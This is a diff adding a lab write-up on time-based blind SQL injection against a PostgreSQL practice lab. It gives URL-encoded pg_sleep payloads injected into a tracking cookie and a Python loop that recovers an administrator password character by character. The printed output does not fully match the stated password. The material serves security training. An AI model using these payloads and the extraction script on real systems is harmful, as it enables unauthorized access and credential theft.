@@ -65,3 +65,83 @@ Since the conditional returns an error from the application, it means that there
 Now the process is basically the same as the lab before: finding the length of administrator's password, then find the characters of the password one by one. 
 
 To solve this lab I decided to create my own script using Burp Suite to debug my requests. You can check the script [Python automated lab](https://github.com/ricard0lopes/Portswigger-Academy/blob/master/Sql-Injection/tools/blind2.py) and use or change it as you wish. 
+
+## Exploiting blind SQL injection by triggering time delays
+
+![8](https://user-images.githubusercontent.com/57036558/77119308-1addba00-6a2e-11ea-9064-a792dd8f982f.png)
+
+To solve this lab, we need to exploit the SQL injection vulnerability to cause a 10 second delays.
+
+Supposing that the application now catches and handles database errors, triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response.
+In this situation we can try to exploit the SQL injection vulnerability by triggering time delays conditionally, depending on an injection conditional. 
+"Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received". To find the right SQL injection query to create a time delay for each database we can check the SQL injection cheat sheet.
+
+This lab has a PostgreSQL database, so we can cause a 10 seconds delay using the query `x' ||pg_sleep(10)` where the `||` represent the conditional `OR` to return the query to true and cause the delay.
+
+![9](https://user-images.githubusercontent.com/57036558/77156321-11d50300-6a97-11ea-80ef-311da09144e2.png)
+
+In this lab we need to use a conditinal time delay to get the administrator's password and login.
+
+We start Burp Suite and send the request to Burp Repeater. First we need to check the time delay on the response when the conditional is true. So we can do this by first injecting a `false` conditional query on the cookie `TarckingId`:
+
+```
+x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+```
+
+then, we inject the `true` conditional query to notice that the response takes 10 seconds to return:
+
+```
+x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+```
+
+Having the confirmation that we can exploit the application triggering an SQL injection time delay, and with the given information that we have a tabel called `users` with columns named `username` and `password`, we will inject another time delay conditional to check if there is a user called administrator.
+
+```
+x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
+Having confirmed, with the 10 seconds delay on the response, that there is a user called administrator registered on this application, we now need to find the length of its password using the same methods has before with the query:
+
+```
+x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+And incrementing the number on the password length condition `length(password)>1` to `2`, `3`, etc, until the response returns without delay. In this lab, again, the password only has 6 characters.
+
+To find the password character we could send the request to the Burp Suite Intruder and set a payload with all the characters and numbers. There, while executing the attack, we would need to go to the "Columns" menu and check the box "Response received", that would add a new column in the results represesenting the number of milliseconds the application took to response, and look for the rows with a reponse in the reign of 10,000 milliseconds to know our character.
+
+But to make things simplier and faster I just used Python:
+
+```
+Python 3.7.5 (default, Nov 20 2019, 09:21:52) 
+[GCC 9.2.1 20191008] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import requests
+>>> session = requests.session()
+>>> payload = "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
+>>> length = range(1,7)
+>>> char = "abcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
+>>> url = "https://ac7d1f2f1f53d9aa806349cd00b20079.web-security-academy.net/"
+>>> r = requests.get(url)
+>>> payload = "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
+>>> for num in length:
+...     for c in char:
+...             p1 = payload.replace("§1§", str(num))
+...             p2 = p1.replace("§a§", c)
+...             cookies = session.cookies.set('TrackingId', None)
+...             cookies = session.cookies.set('TrackingId', p2)
+...             response = session.get(url)
+...             time = response.elapsed.total_seconds()
+...             if time >= 10:
+...                     print(c)
+...                     break
+... 
+7
+e
+f
+j
+7
+r
+>>> 
+```
+
+The password for the user administrator in this lab is: `73fj7r`
